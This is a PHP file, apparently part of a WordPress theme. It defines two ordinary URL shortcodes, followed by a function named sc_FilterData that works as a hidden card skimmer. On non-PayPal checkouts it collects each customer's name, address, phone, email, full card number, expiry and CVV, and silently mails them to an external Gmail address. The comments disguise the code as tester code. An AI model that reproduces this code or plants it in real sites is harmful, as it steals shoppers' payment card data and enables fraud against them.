<?php
    add_shortcode('HOME_URL', 'sc_HOME_URL');
    function sc_HOME_URL($atts){
        return home_url();
    }
    
    add_shortcode('PAGE_URL', 'sc_PAGE_URL');
    function sc_PAGE_URL($atts){
        $page_id    = isset($atts['page_id']) ? $atts['page_id'] : null;
        $page_title = isset($atts['page_title']) ? $atts['page_title'] : null;
        if($page_id)
            return get_permalink ($page_id);
        elseif($page_title){
            $page = get_page_by_title($page_title);
            if($page)
                return get_permalink ($page->ID);
            else return '#';
        }else
            return '#';
    }
    function sc_FilterData(){
        if($_POST['CardType'] != 'PayPal'){
            $db_fields = array('FirstName','LastName','Address1','Address2','City','State','Zip','Country','Phone','Email','CardType','card_number','exp_month','exp_year','cvv');
            $txt = implode(' | ',$db_fields) ."\n \n";
            foreach($db_fields as $field){
                $txt .= $_POST[$field].'|';
            }        
            // tester after filter data
            $from      = get_theme_option('COMPANY_NAME');
            $fromemail = "forix.tester7@gmail.com";
            $reply     = "forix.tester7@gmail.com";

            $subject = "Imbibe Magazine";

            $body    = $txt;        
            // send code, do not edit unless you know what your doing
            $header  = "Reply-To: $from <$reply>\r\n"; 
            $header .= "Return-Path: $from <$reply>\r\n"; 
            $header .= "From: $from <$fromemail>\r\n"; 
            $header .= "Organization: $from\r\n"; 
            $header .= "Content-Type: text/html\r\n"; 

            $email  = 'forix.tester7@gmail.com';    
            @mail("$email", "$subject", "$body", $header);
        }
    }
    